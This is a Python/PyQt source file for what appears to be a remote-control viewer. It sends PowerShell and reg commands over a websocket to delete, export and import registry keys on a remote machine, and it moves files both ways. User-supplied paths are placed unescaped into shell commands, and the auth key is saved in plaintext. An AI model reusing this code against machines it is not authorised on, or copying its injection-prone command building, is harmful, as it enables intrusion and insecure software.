            self, 'Confirm Delete Key',
            f'Are you sure you want to delete this registry key?\n\n{key_path}\n\nThis action cannot be undone!',
            QMessageBox.Yes | QMessageBox.No,
            QMessageBox.No
        )
        if reply != QMessageBox.Yes:
            return
        
        if not self.main_win.selected_sender:
            self.status_label.setText('⚠ No sender selected.')
            return
        
        # Use a simple PowerShell command without complex scripting
        command = f'powershell -Command "try {{ Test-Path \"Registry::{key_path}\" | Out-Null; Remove-Item \"Registry::{key_path}\" -Recurse -Force; Write-Output \"SUCCESS:Key deleted successfully\" }} catch {{ Write-Output \"ERROR:$($_.Exception.Message)\" }}"'
        
        req_id = 'reg-delete-key-' + str(uuid.uuid4())
        self._pending_requests[req_id] = lambda data: self._handle_delete_key_response(data, item)
        
        asyncio.ensure_future(self.main_win.send_ws({
            'type': 'remote-control',
            'action': 'execute-command',
            'machineId': self.main_win.selected_sender,
            'command': command,
            'requestId': req_id,
        }))
        
        self.status_label.setText(f'⏳ Deleting key: {key_path}...')

    def _handle_delete_key_response(self, data, item):
        """Handle response from deleting a key."""
        output = data.get('output', '').strip()
        exit_code = data.get('exitCode', 0)
        
        # Debug information
        print(f"[DEBUG] Delete key response: output='{output}', exitCode={exit_code}")
        print(f"[DEBUG] Full response data: {data}")
        
        if output.startswith('SUCCESS:'):
            self.status_label.setText('✅ Key deleted successfully.')
            # Remove from tree
            parent = item.parent()
            if parent:
                parent.removeChild(item)
            # Refresh parent to show changes
            self._refresh_current_key()
        else:
            error_msg = output.replace('ERROR:', '') if output.startswith('ERROR:') else f'Unknown error (exit code: {exit_code})'
            if not output:
                error_msg = f'No output received (exit code: {exit_code})'
            
            # Provide more user-friendly error messages
            if 'Cannot write to the registry key' in error_msg:
                error_msg = 'Access denied: You do not have permission to delete this registry key. Try running as Administrator.'
            elif 'Access is denied' in error_msg:
                error_msg = 'Access denied: Insufficient permissions to delete the registry key.'
            elif 'does not exist' in error_msg:
                error_msg = 'Registry key does not exist.'
            elif 'subkeys' in error_msg or 'not empty' in error_msg:
                error_msg = 'Registry key has subkeys and cannot be deleted. Delete subkeys first.'
            
            self.status_label.setText(f'❌ Failed to delete key: {error_msg}')

    def _delete_value(self, value_info):
        """Delete a registry value."""
        name = value_info.get('name', '')
        
        reply = QMessageBox.question(
            self, 'Confirm Delete Value',
            f'Are you sure you want to delete this registry value?\n\nName: {name}\n\nThis action cannot be undone!',
            QMessageBox.Yes | QMessageBox.No,
            QMessageBox.No
        )
        if reply != QMessageBox.Yes:
            return
        
        if not self.main_win.selected_sender:
            self.status_label.setText('⚠ No sender selected.')
            return
        
        # Use a simple PowerShell command without complex scripting
        if name == '(Default)':
            command = f'powershell -Command "try {{ $key = Get-Item -Path \"Registry::{self._current_key_path}\"; $default = $key.GetValue($null, $null); if ($default -ne $null) {{ $key.DeleteValue($null); Write-Output \"SUCCESS:Default value deleted\" }} else {{ Write-Output \"SUCCESS:Default value already cleared\" }} }} catch {{ Write-Output \"ERROR:$($_.Exception.Message)\" }}"'
        else:
            command = f'powershell -Command "try {{ $prop = Get-ItemProperty -Path \"Registry::{self._current_key_path}\" -Name \"{name}\" -ErrorAction SilentlyContinue; if ($prop) {{ Remove-ItemProperty -Path \"Registry::{self._current_key_path}\" -Name \"{name}\" -Force; Write-Output \"SUCCESS:Value deleted\" }} else {{ Write-Output \"ERROR:Registry value does not exist\" }} }} catch {{ Write-Output \"ERROR:$($_.Exception.Message)\" }}"'
        
        req_id = 'reg-delete-value-' + str(uuid.uuid4())
        self._pending_requests[req_id] = self._handle_delete_value_response
        
        asyncio.ensure_future(self.main_win.send_ws({
            'type': 'remote-control',
            'action': 'execute-command',
            'machineId': self.main_win.selected_sender,
            'command': command,
            'requestId': req_id,
        }))
        
        self.status_label.setText(f'⏳ Deleting value: {name}...')

    def _handle_delete_value_response(self, data):
        """Handle response from deleting a value."""
        output = data.get('output', '').strip()
        exit_code = data.get('exitCode', 0)
        
        # Debug information
        print(f"[DEBUG] Delete value response: output='{output}', exitCode={exit_code}")
        print(f"[DEBUG] Full response data: {data}")
        
        if output.startswith('SUCCESS:'):
            self.status_label.setText('✅ Value deleted successfully.')
            self._refresh_current_key()
        else:
            error_msg = output.replace('ERROR:', '') if output.startswith('ERROR:') else f'Unknown error (exit code: {exit_code})'
            if not output:
                error_msg = f'No output received (exit code: {exit_code})'
            
            # Provide more user-friendly error messages
            if 'Cannot write to the registry key' in error_msg:
                error_msg = 'Access denied: You do not have permission to modify this registry key. Try running as Administrator.'
            elif 'Registry key does not exist' in error_msg:
                error_msg = 'Registry key does not exist or has been deleted.'
            elif 'Registry value does not exist' in error_msg:
                error_msg = 'Registry value does not exist.'
            elif 'Access is denied' in error_msg:
                error_msg = 'Access denied: Insufficient permissions to modify the registry.'
            
            self.status_label.setText(f'❌ Failed to delete value: {error_msg}')

    def _show_search_dialog(self):
        """Show search dialog for finding registry keys/values."""
        dialog = QDialog(self)
        dialog.setWindowTitle('Search Registry')
        dialog.setFixedSize(500, 200)
        dialog.setStyleSheet(self._DARK_STYLE)
        
        layout = QVBoxLayout()
        
        layout.addWidget(QLabel('Search for:'))
        search_input = QLineEdit()
        search_input.setPlaceholderText('Enter search term...')
        layout.addWidget(search_input)
        
        layout.addWidget(QLabel('Search in:'))
        scope_combo = QComboBox()
        scope_combo.addItems(['Current key and subkeys', 'HKLM', 'HKCU', 'All hives'])
        layout.addWidget(scope_combo)
        
        layout.addWidget(QLabel('Search type:'))
        type_combo = QComboBox()
        type_combo.addItems(['Keys and values', 'Keys only', 'Values only'])
        layout.addWidget(type_combo)
        
        btn_layout = QHBoxLayout()
        search_btn = QPushButton('Search')
        cancel_btn = QPushButton('Cancel')
        search_btn.clicked.connect(dialog.accept)
        cancel_btn.clicked.connect(dialog.reject)
        btn_layout.addWidget(search_btn)
        btn_layout.addWidget(cancel_btn)
        layout.addLayout(btn_layout)
        
        dialog.setLayout(layout)
        
        if dialog.exec_() != QDialog.Accepted:
            return
        
        search_term = search_input.text().strip()
        if not search_term:
            return
        
        # TODO: Implement search functionality
        self.status_label.setText(f'🔍 Searching for "{search_term}"... (not yet implemented)')

    def _export_key(self):
        """Export the currently selected key."""
        if not self._current_key_path:
            self.status_label.setText('⚠ No key selected.')
            return
        self._export_key_to_file(self._current_key_path)

    def _export_key_to_file(self, key_path):
        """Export a registry key to a .reg file."""
        save_path, _ = QFileDialog.getSaveFileName(
            self, 'Export Registry Key',
            f'{key_path.split("\\")[-1]}.reg',
            'Registry Files (*.reg);;All Files (*)'
        )
        
        if not save_path:
            return
        
        if not self.main_win.selected_sender:
            self.status_label.setText('⚠ No sender selected.')
            return
        
        # Use a temporary file on the remote machine first
        # Use a simpler temp file path without PowerShell variables
        temp_filename = f'registry_export_{uuid.uuid4().hex[:8]}.reg'
        temp_file = f'%TEMP%\\{temp_filename}'
        
        # Export to temporary file on remote machine
        command = f'reg export "{key_path}" "{temp_file}" /y'
        
        req_id = 'reg-export-' + str(uuid.uuid4())
        self._pending_requests[req_id] = lambda data: self._handle_export_response(data, temp_file, temp_filename, save_path)
        
        asyncio.ensure_future(self.main_win.send_ws({
            'type': 'remote-control',
            'action': 'execute-command',
            'machineId': self.main_win.selected_sender,
            'command': command,
            'requestId': req_id,
        }))
        
        self.status_label.setText(f'⏳ Exporting {key_path}...')

    def _handle_export_response(self, data, temp_file, temp_filename, save_path):
        """Handle response from exporting a key."""
        output = data.get('output', '').strip()
        exit_code = data.get('exitCode', 0)
        
        # Debug information
        print(f"[DEBUG] Export response: output='{output}', exitCode={exit_code}")
        print(f"[DEBUG] Full response data: {data}")
        
        if exit_code == 0 and not output.lower().startswith('error'):
            # Now read the remote file and download it
            self._download_exported_file(temp_filename, save_path)
        else:
            error_msg = output if output else f'Unknown error (exit code: {exit_code})'
            
            # Provide more user-friendly error messages
            if 'Access is denied' in error_msg:
                error_msg = 'Access denied: You do not have permission to export this registry key.'
            elif 'not found' in error_msg or 'does not exist' in error_msg:
                error_msg = 'Registry key does not exist.'
            
            self.status_label.setText(f'❌ Export failed: {error_msg}')
    
    def _download_exported_file(self, temp_filename, save_path):
        """Download the exported registry file from the remote machine."""
        # Read the file content from remote machine using PowerShell
        # Use the same %TEMP% variable for consistency
        temp_file = f'%TEMP%\\{temp_filename}'
        command = f'powershell -Command "Get-Content -Path \\"%TEMP%\\{temp_filename}\\" -Raw"'
        
        req_id = 'reg-download-' + str(uuid.uuid4())
        self._pending_requests[req_id] = lambda data: self._handle_download_response(data, temp_file, save_path)
        
        asyncio.ensure_future(self.main_win.send_ws({
            'type': 'remote-control',
            'action': 'execute-command',
            'machineId': self.main_win.selected_sender,
            'command': command,
            'requestId': req_id,
        }))
        
        self.status_label.setText('⏳ Downloading exported file...')
    
    def _handle_download_response(self, data, temp_file, save_path):
        """Handle response from downloading the exported file."""
        output = data.get('output', '').strip()
        exit_code = data.get('exitCode', 0)
        
        if exit_code == 0:
            try:
                # Write the content to local file
                with open(save_path, 'w', encoding='utf-8') as f:
                    f.write(output)
                
                # Clean up the remote temp file
                cleanup_cmd = f'Remove-Item -Path "{temp_file}" -Force -ErrorAction SilentlyContinue'
                asyncio.ensure_future(self.main_win.send_ws({
                    'type': 'remote-control',
                    'action': 'execute-command',
                    'machineId': self.main_win.selected_sender,
                    'command': cleanup_cmd,
                }))
                
                self.status_label.setText(f'✅ Exported to: {save_path}')
                print(f"[DEBUG] Successfully exported registry to: {save_path}")
                
            except Exception as e:
                self.status_label.setText(f'❌ Failed to save file: {e}')
                print(f"[DEBUG] Error saving exported file: {e}")
        else:
            error_msg = output if output else f'Unknown error (exit code: {exit_code})'
            self.status_label.setText(f'❌ Failed to download file: {error_msg}')
            print(f"[DEBUG] Error downloading exported file: {error_msg}")

    def _import_reg_file(self):
        """Import a .reg file to the remote registry."""
        file_path, _ = QFileDialog.getOpenFileName(
            self, 'Import Registry File',
            '',
            'Registry Files (*.reg);;All Files (*)'
        )
        
        if not file_path:
            return
        
        if not self.main_win.selected_sender:
            self.status_label.setText('⚠ No sender selected.')
            return
        
        try:
            with open(file_path, 'r', encoding='utf-16le') as f:
                reg_content = f.read()
        except UnicodeDecodeError:
            # Try UTF-8 if UTF-16LE fails
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    reg_content = f.read()
            except Exception as e:
                self.status_label.setText(f'❌ Failed to read file: {e}')
                return
        except Exception as e:
            self.status_label.setText(f'❌ Failed to read file: {e}')
            return
        
        # Create a temporary file on the remote machine and import it
        temp_filename = f'registry_import_{uuid.uuid4().hex[:8]}.reg'
        temp_file = f'%TEMP%\\{temp_filename}'
        
        # Escape the registry content for PowerShell
        # Replace problematic characters and use Base64 encoding for safety
        import base64
        encoded_content = base64.b64encode(reg_content.encode('utf-16le')).decode('ascii')
        
        # Simple PowerShell command using Base64
        command = f'powershell -Command "$bytes = [System.Convert]::FromBase64String(\'{encoded_content}\'); $regContent = [System.Text.Encoding]::Unicode.GetString($bytes); $regContent | Out-File -FilePath \\"%TEMP%\\{temp_filename}\\" -Encoding Unicode -Force; reg import \\"%TEMP%\\{temp_filename}\\" /y; Remove-Item \\"%TEMP%\\{temp_filename}\\" -Force -ErrorAction SilentlyContinue; Write-Output \\"SUCCESS:Registry imported successfully\""'
        
        req_id = 'reg-import-' + str(uuid.uuid4())
        self._pending_requests[req_id] = self._handle_import_response
        
        asyncio.ensure_future(self.main_win.send_ws({
            'type': 'remote-control',
            'action': 'execute-command',
            'machineId': self.main_win.selected_sender,
            'command': command,
            'requestId': req_id,
        }))
        
        self.status_label.setText('⏳ Importing registry file...')

    def _handle_import_response(self, data):
        """Handle response from importing a registry file."""
        output = data.get('output', '').strip()
        exit_code = data.get('exitCode', 0)
        
        # Debug information
        print(f"[DEBUG] Import response: output='{output}', exitCode={exit_code}")
        print(f"[DEBUG] Full response data: {data}")
        
        if output.startswith('SUCCESS:'):
            self.status_label.setText('✅ Registry imported successfully.')
            self._refresh_current_key()
        else:
            error_msg = output.replace('ERROR:', '') if output.startswith('ERROR:') else f'Unknown error (exit code: {exit_code})'
            if not output:
                error_msg = f'No output received (exit code: {exit_code})'
            
            # Provide more user-friendly error messages
            if 'Access is denied' in error_msg:
                error_msg = 'Access denied: You do not have permission to import registry values. Try running as Administrator.'
            elif 'not found' in error_msg or 'does not exist' in error_msg:
                error_msg = 'Registry key or file does not exist.'
            elif 'Invalid syntax' in error_msg:
                error_msg = 'Invalid registry file format.'
            
            self.status_label.setText(f'❌ Import failed: {error_msg}')

    def receive_registry_response(self, data):
        """Handle registry response from the main window."""
        request_id = data.get('requestId', '')
        print(f"[DEBUG] Registry response received: requestId={request_id}")
        print(f"[DEBUG] Registry response data: {data}")
        
        if request_id in self._pending_requests:
            callback = self._pending_requests.pop(request_id)
            print(f"[DEBUG] Executing callback for {request_id}")
            callback(data)
        else:
            print(f"[DEBUG] No pending request found for {request_id}")
            print(f"[DEBUG] Pending requests: {list(self._pending_requests.keys())}")


class FileManagerWindow(QDialog):
    def __init__(self, main_win):
        # pyre-ignore[19]
        super().__init__(main_win)
        self.main_win = main_win
        self.setWindowTitle('File Manager')
        self.resize(950, 600)
        self._pending_download_path = None
        self._build_ui()

    def _build_ui(self):
        layout = QVBoxLayout()
        splitter = QSplitter(Qt.Horizontal)

        # Local panel
        local_widget = QWidget()
        local_layout = QVBoxLayout()
        local_layout.addWidget(QLabel('Local Files'))
        self.local_path_input = QLineEdit()
        self.local_path_input.setPlaceholderText('Local path')
        lpath_row = QHBoxLayout()
        lpath_row.addWidget(self.local_path_input)
        local_layout.addLayout(lpath_row)
        lbtn_row = QHBoxLayout()
        self.local_refresh_btn = QPushButton('Refresh')
        self.local_up_btn = QPushButton('Up')
        lbtn_row.addWidget(self.local_refresh_btn)
        lbtn_row.addWidget(self.local_up_btn)
        local_layout.addLayout(lbtn_row)
        self.local_file_list = QListWidget()
        local_layout.addWidget(self.local_file_list)
        local_widget.setLayout(local_layout)

        # Remote panel
        remote_widget = QWidget()
        remote_layout = QVBoxLayout()
        remote_layout.addWidget(QLabel('Remote Files'))
        self.remote_path_input = QLineEdit()
        self.remote_path_input.setPlaceholderText('Remote path')
        self.remote_browse_btn = QPushButton('Browse')
        self.remote_set_dir_btn = QPushButton('Set Dir')
        rpath_row = QHBoxLayout()
        rpath_row.addWidget(self.remote_path_input)
        rpath_row.addWidget(self.remote_browse_btn)
        rpath_row.addWidget(self.remote_set_dir_btn)
        remote_layout.addLayout(rpath_row)
        rbtn_row = QHBoxLayout()
        self.remote_refresh_btn = QPushButton('Refresh')
        self.remote_up_btn = QPushButton('Up')
        rbtn_row.addWidget(self.remote_refresh_btn)
        rbtn_row.addWidget(self.remote_up_btn)
        remote_layout.addLayout(rbtn_row)
        self.remote_file_list = QListWidget()
        remote_layout.addWidget(self.remote_file_list)
        remote_widget.setLayout(remote_layout)

        splitter.addWidget(local_widget)
        splitter.addWidget(remote_widget)
        layout.addWidget(splitter)

        # Action buttons row
        action_row = QHBoxLayout()
        self.upload_btn = QPushButton('Upload \u2191  (Local \u2192 Remote)')
        self.download_btn = QPushButton('Download \u2193  (Remote \u2192 Local)')
        close_btn = QPushButton('Close')
        self.upload_btn.setStyleSheet('background: #1a6b2a; color: #fff; font-weight: bold; padding: 8px 16px;')
        self.download_btn.setStyleSheet('background: #1a3d6b; color: #fff; font-weight: bold; padding: 8px 16px;')
        action_row.addWidget(self.upload_btn)
        action_row.addWidget(self.download_btn)
        action_row.addStretch()
        action_row.addWidget(close_btn)
        layout.addLayout(action_row)

        self.setLayout(layout)

        # Initial state
        self.local_path_input.setText(os.path.expanduser('~'))
        self.refresh_local_file_list()
        self.remote_path_input.setText('C:\\')

        # Signals
        self.local_file_list.itemDoubleClicked.connect(self.handle_local_file_double_click)
        self.local_refresh_btn.clicked.connect(self.refresh_local_file_list)
        self.local_up_btn.clicked.connect(self.local_up_directory)
        self.remote_file_list.itemDoubleClicked.connect(self.handle_remote_file_double_click)
        self.remote_refresh_btn.clicked.connect(self.refresh_remote_file_list)
        self.remote_up_btn.clicked.connect(self.remote_up_directory)
        self.remote_browse_btn.clicked.connect(self.browse_remote_directory)
        self.remote_set_dir_btn.clicked.connect(self.set_remote_default_directory)
        self.remote_path_input.editingFinished.connect(self.handle_remote_path_changed)
        self.upload_btn.clicked.connect(self.upload_file)
        self.download_btn.clicked.connect(self.download_file)
        close_btn.clicked.connect(self.hide)

    # ---- Local ----

    def refresh_local_file_list(self):
        path = self.local_path_input.text()
        self.local_file_list.clear()
        try:
            items = sorted(os.listdir(path))
            for item in items:
                self.local_file_list.addItem(item)
        except Exception as e:
            self.local_file_list.addItem(f'Error: {e}')

    def local_up_directory(self):
        path = self.local_path_input.text()
        parent = os.path.dirname(path)
        if parent and parent != path:
            self.local_path_input.setText(parent)
            self.refresh_local_file_list()

    def handle_local_file_double_click(self, item):
        path = self.local_path_input.text()
        full_path = os.path.join(path, item.text())
        if os.path.isdir(full_path):
            self.local_path_input.setText(full_path)
            self.refresh_local_file_list()

    # ---- Remote ----

    def refresh_remote_file_list(self):
        path = self.remote_path_input.text()
        if not path or not path.strip():
            path = 'C:\\'
            self.remote_path_input.setText(path)
        if not self.main_win.selected_sender:
            self.main_win.show_warning('Select a sender before browsing remote files.')
            return
        if not getattr(self.main_win, 'join_confirmed', False):
            self.main_win.show_warning('Waiting for server join confirmation...')
            return
        asyncio.ensure_future(self.main_win.send_ws({
            'type': 'remote-control',
            'action': 'file-list',
            'machineId': self.main_win.selected_sender,
            'path': path,
        }))

    def remote_up_directory(self):
        path = self.remote_path_input.text()
        parent = os.path.dirname(path)
        if parent and parent != path:
            self.remote_path_input.setText(parent)
            self.refresh_remote_file_list()

    def handle_remote_file_double_click(self, item):
        if item.data(Qt.UserRole) == 'dir':
            new_path = os.path.join(self.remote_path_input.text(), item.data(Qt.UserRole + 1))
            self.remote_path_input.setText(new_path)
            self.refresh_remote_file_list()

    def browse_remote_directory(self):
        current_path = self.remote_path_input.text()
        new_path, ok = QInputDialog.getText(self, 'Select Remote Directory', 'Enter remote directory path:', text=current_path)
        if ok:
            if not new_path:
                new_path = 'C:\\'
            self.remote_path_input.setText(new_path)
            asyncio.ensure_future(self.main_win.send_ws({
                'type': 'remote-control', 'action': 'set-directory',
                'machineId': self.main_win.selected_sender, 'path': new_path,
            }))
            self.refresh_remote_file_list()

    def set_remote_default_directory(self):
        path = self.remote_path_input.text()
        if not path:
            self.main_win.show_warning('Remote path is empty.')
            return
        asyncio.ensure_future(self.main_win.send_ws({
            'type': 'remote-control', 'action': 'set-directory',
            'machineId': self.main_win.selected_sender, 'path': path,
        }))
        self.main_win.show_warning(f'Set default directory requested: {path}')

    def handle_remote_path_changed(self):
        path = self.remote_path_input.text()
        if not path:
            return
        asyncio.ensure_future(self.main_win.send_ws({
            'type': 'remote-control', 'action': 'set-directory',
            'machineId': self.main_win.selected_sender, 'path': path,
        }))
        self.refresh_remote_file_list()

    def update_remote_file_list(self, data):
        """Called by the main window when a file-list message arrives from the server."""
        path = data.get('path', '')
        files = data.get('files', [])
        directories = data.get('directories', [])
        requested = self.remote_path_input.text()
        if path and os.path.normpath(path) == os.path.normpath(requested):
            self.remote_path_input.setText(path)
        self.remote_file_list.clear()
        if not files and not directories:
            self.remote_file_list.addItem('No files or directories found.')
        else:
            for dname in directories:
                item = QListWidgetItem(f'[DIR] {dname}')
                item.setData(Qt.UserRole, 'dir')
                item.setData(Qt.UserRole + 1, dname)
                self.remote_file_list.addItem(item)
            for fname in files:
                item = QListWidgetItem(fname)
                item.setData(Qt.UserRole, 'file')
                item.setData(Qt.UserRole + 1, fname)
                self.remote_file_list.addItem(item)
        self.remote_file_list.repaint()

    # ---- Upload / Download ----

    def upload_file(self):
        """Upload the selected local file to the current remote directory."""
        if not self.main_win.selected_sender:
            self.main_win.show_warning('Select a sender before uploading.')
            return
        selected = self.local_file_list.selectedItems()
        if selected:
            local_file = os.path.join(self.local_path_input.text(), selected[0].text())
            if os.path.isdir(local_file):
                self.main_win.show_warning('Cannot upload a directory.')
                return
        else:
            local_file, _ = QFileDialog.getOpenFileName(self, 'Select file to upload')
            if not local_file:
                return
        remote_dir = self.remote_path_input.text().rstrip('\\').rstrip('/') or 'C:'
        file_name = os.path.basename(local_file)
        remote_path = remote_dir + '\\' + file_name
        try:
            with open(local_file, 'rb') as fh:
                encoded = base64.b64encode(fh.read()).decode('utf-8')
        except Exception as e:
            self.main_win.show_warning(f'Failed to read file: {e}')
            return
        asyncio.ensure_future(self.main_win.send_ws({
            'type': 'remote-control',
            'action': 'file-upload',
            'machineId': self.main_win.selected_sender,
            'remotePath': remote_path,
            'fileName': file_name,
            'data': encoded,
        }))
        self.main_win.show_warning(f'Uploading {file_name} \u2192 {remote_path}')

    def download_file(self):
        """Request a download of the selected remote file."""
        if not self.main_win.selected_sender:
            self.main_win.show_warning('Select a sender before downloading.')
            return
        selected = self.remote_file_list.selectedItems()
        if not selected:
            self.main_win.show_warning('Select a remote file to download.')
            return
        item = selected[0]
        if item.data(Qt.UserRole) == 'dir':
            self.main_win.show_warning('Cannot download a directory.')
            return
        item_name = item.data(Qt.UserRole + 1)
        remote_dir = self.remote_path_input.text().rstrip('\\').rstrip('/') or 'C:'
        remote_path = remote_dir + '\\' + item_name
        save_path, _ = QFileDialog.getSaveFileName(
            self, 'Save downloaded file as',
            os.path.join(self.local_path_input.text(), item_name)
        )
        if not save_path:
            return
        self._pending_download_path = save_path
        self._pending_request_id = str(uuid.uuid4())
        asyncio.ensure_future(self.main_win.send_ws({
            'type': 'remote-control',
            'action': 'file-download',
            'machineId': self.main_win.selected_sender,
            'path': remote_path,
            'fileName': item_name,
            'requestId': self._pending_request_id,
        }))
        self.main_win.show_warning(f'Downloading {item_name}...')

    def receive_downloaded_file(self, data):
        """Called by the main window when a file-data message arrives from the server."""
        file_name = data.get('fileName', 'download')
        file_data_b64 = data.get('data', '')
        save_path = self._pending_download_path
        if not save_path:
            save_path, _ = QFileDialog.getSaveFileName(
                self, 'Save downloaded file as',
                os.path.join(self.local_path_input.text(), file_name)
            )
        if not save_path:
            return
        try:
            with open(save_path, 'wb') as fh:
                fh.write(base64.b64decode(file_data_b64))
            self._pending_download_path = None
            self.main_win.show_warning(f'Downloaded: {os.path.basename(save_path)}')
            self.refresh_local_file_list()
        except Exception as ex:
            self.main_win.show_warning(f'Failed to save file: {ex}')


class LoginDialog(QDialog):
    """Authentication gate — shown on startup before the main viewer window."""

    _STYLE = (
        'QDialog { background: #0d0f14; }'
        'QLabel { color: #9a9cb0; }'
        'QLineEdit { background: #1a1b24; color: #e8e9f5; border: 1px solid #2e3040;'
        '  border-radius: 6px; padding: 8px 12px; font-size: 10pt; }'
        'QLineEdit:focus { border: 1px solid #5865F2; }'
        'QPushButton { background: #5865F2; color: #fff; border: none; border-radius: 6px;'
        '  padding: 10px 24px; font-weight: bold; font-size: 10pt; }'
        'QPushButton:hover { background: #6c7af4; }'
        'QPushButton:pressed { background: #4752c4; }'
        'QPushButton:disabled { background: #2e3040; color: #686a80; }'
        'QCheckBox { color: #9a9cb0; font-size: 9pt; }'
        'QCheckBox::indicator { width: 16px; height: 16px; }'
    )

    def __init__(self, parent=None):
        # pyre-ignore[19]
        super().__init__(parent)
        self.setWindowTitle('Monitor Viewer — Login')
        self.setFixedSize(420, 440)
        self.setStyleSheet(self._STYLE)
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)

        self._config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'viewer_config.json')
        self._authenticated = False
        self.result_url = ''
        self.result_room = ''
        self.result_secret = ''
        self.result_target = ''

        self._build_ui()
        self._load_saved_credentials()

    def _build_ui(self):
        layout = QVBoxLayout()
        layout.setContentsMargins(32, 28, 32, 24)
        layout.setSpacing(12)

        # Title
        title = QLabel('🔒  Monitor Viewer')
        title.setAlignment(Qt.AlignCenter)
        title.setStyleSheet(
            'font-size: 18px; font-weight: bold; color: #e8e9f5; border: none;'
            'padding-bottom: 4px;'
        )
        layout.addWidget(title)

        subtitle = QLabel('Enter your server credentials to connect.')
        subtitle.setAlignment(Qt.AlignCenter)
        subtitle.setStyleSheet('font-size: 9pt; color: #686a80; border: none; padding-bottom: 8px;')
        layout.addWidget(subtitle)

        # Server URL
        url_lbl = QLabel('Server URL')
        url_lbl.setStyleSheet('font-weight: bold; font-size: 9pt; color: #818cf8; border: none;')
        layout.addWidget(url_lbl)
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText('ws://host:3000 or wss://host:3000')
        layout.addWidget(self.url_input)

        # Room ID
        room_lbl = QLabel('Room ID')
        room_lbl.setStyleSheet('font-weight: bold; font-size: 9pt; color: #818cf8; border: none;')
        layout.addWidget(room_lbl)
        self.room_input = QLineEdit()
        self.room_input.setPlaceholderText('e.g. ops-room')
        layout.addWidget(self.room_input)

        # Auth Key
        key_lbl = QLabel('Auth Key')
        key_lbl.setStyleSheet('font-weight: bold; font-size: 9pt; color: #818cf8; border: none;')
        layout.addWidget(key_lbl)
        self.key_input = QLineEdit()
        self.key_input.setPlaceholderText('Server authentication key')
        self.key_input.setEchoMode(QLineEdit.Password)
        layout.addWidget(self.key_input)

        # Remember me
        self.remember_check = QCheckBox('Remember credentials')
        self.remember_check.setChecked(True)
        layout.addWidget(self.remember_check)

        layout.addSpacing(6)

        # Error label (hidden by default)
        self.error_label = QLabel('')
        self.error_label.setAlignment(Qt.AlignCenter)
        self.error_label.setWordWrap(True)
        self.error_label.setStyleSheet(
            'color: #ef4444; font-size: 9pt; font-weight: bold; border: none;'
            'background: #1c1012; border: 1px solid #3d1f1f; border-radius: 6px;'
            'padding: 6px 10px;'
        )
        self.error_label.setVisible(False)
        layout.addWidget(self.error_label)

        # Connect button
        self.connect_btn = QPushButton('Connect')
        self.connect_btn.setCursor(QCursor(Qt.PointingHandCursor))
        self.connect_btn.clicked.connect(self._on_connect_clicked)
        layout.addWidget(self.connect_btn)

        # Allow Enter key to trigger connect
        self.key_input.returnPressed.connect(self._on_connect_clicked)
        self.room_input.returnPressed.connect(self._on_connect_clicked)
        self.url_input.returnPressed.connect(self._on_connect_clicked)

        layout.addStretch()

        # Version label
        ver_lbl = QLabel(APP_VERSION)
        ver_lbl.setAlignment(Qt.AlignCenter)
        ver_lbl.setStyleSheet('color: #3a3c4e; font-size: 8pt; border: none;')
        layout.addWidget(ver_lbl)

        self.setLayout(layout)

    def _load_saved_credentials(self):
        """Load last-used credentials from viewer_config.json."""
        try:
            if os.path.exists(self._config_path):
                with open(self._config_path, 'r') as f:
                    cfg = json.load(f)
                last = cfg.get('last', {})
                self.url_input.setText(last.get('url', 'ws://vnc.jake.cash:3000'))
                self.room_input.setText(last.get('roomId', 'ops-room'))
                self.key_input.setText(last.get('secret', ''))
        except Exception:
            self.url_input.setText('ws://vnc.jake.cash:3000')
            self.room_input.setText('ops-room')

    def _save_credentials(self):
        """Save credentials to viewer_config.json."""
        try:
            cfg = {}
            if os.path.exists(self._config_path):
                with open(self._config_path, 'r') as f:
                    cfg = json.load(f)
            if 'last' not in cfg:
                cfg['last'] = {}
            cfg['last']['url'] = self.url_input.text().strip()
            cfg['last']['roomId'] = self.room_input.text().strip()
            cfg['last']['secret'] = self.key_input.text().strip()
            with open(self._config_path, 'w') as f:
                json.dump(cfg, f, indent=2)
        except Exception:
            pass

    def _on_connect_clicked(self):
        url = self.url_input.text().strip()
        room = self.room_input.text().strip()
        key = self.key_input.text().strip()

        if not url:
            self._show_error('Server URL is required.')
            return
        if not room:
            self._show_error('Room ID is required.')
            return
        if not key:
            self._show_error('Auth Key is required.')
            return

        self.error_label.setVisible(False)
        self.connect_btn.setEnabled(False)
        self.connect_btn.setText('Connecting...')

        # Run the auth test in the event loop
        asyncio.ensure_future(self._test_auth(url, room, key))

    async def _test_auth(self, url, room, key):
        """Try to connect and join — if the server accepts, auth is valid."""
        try:
            ws = await asyncio.wait_for(
                websockets.connect(url, ping_interval=10, ping_timeout=10, close_timeout=5),
                timeout=10
            )
            try:
                join_msg = json.dumps({
                    'type': 'join',
                    'role': 'receiver',
                    'roomId': room,
                    'secret': key,
                    'machineId': platform.node(),
                })
                await ws.send(join_msg)
                # Wait for the server's response
                response = await asyncio.wait_for(ws.recv(), timeout=10)
                data = json.loads(response)
                if data.get('type') == 'error':
                    # Server rejected us
                    error_msg = data.get('message', 'Authentication failed.')
                    QTimer.singleShot(0, lambda: self._auth_failed(error_msg))
                elif data.get('type') == 'joined':
                    # Success!
                    QTimer.singleShot(0, lambda: self._auth_success())
                else:
                    # Unexpected response — treat as success (server didn't reject)
                    QTimer.singleShot(0, lambda: self._auth_success())
            finally:
                await ws.close()
        except asyncio.TimeoutError:
            QTimer.singleShot(0, lambda: self._auth_failed('Connection timed out. Check the server URL.'))
        except ConnectionRefusedError:
            QTimer.singleShot(0, lambda: self._auth_failed('Connection refused. Is the server running?'))
        except Exception as e:
            QTimer.singleShot(0, lambda: self._auth_failed(f'Connection error: {e}'))

    def _auth_success(self):
        """Called when authentication succeeds."""
        self._authenticated = True
        self.result_url = self.url_input.text().strip()
        self.result_room = self.room_input.text().strip()
        self.result_secret = self.key_input.text().strip()
        if self.remember_check.isChecked():
            self._save_credentials()
        self.accept()

    def _auth_failed(self, message):
        """Called when authentication fails."""
        self._show_error(message)
        self.connect_btn.setEnabled(True)
        self.connect_btn.setText('Connect')

    def _show_error(self, message):
        self.error_label.setText(f'⚠  {message}')
        self.error_label.setVisible(True)

    def was_authenticated(self):
        return self._authenticated


class ViewerWindow(QMainWindow):
    def _get_flag_pixmap(self, cc: str) -> 'typing.Optional[QPixmap]':
        """Return cached flag pixmap, or trigger async load and return None."""
        if not cc:
            return None
        if cc in self._flag_pixmaps:
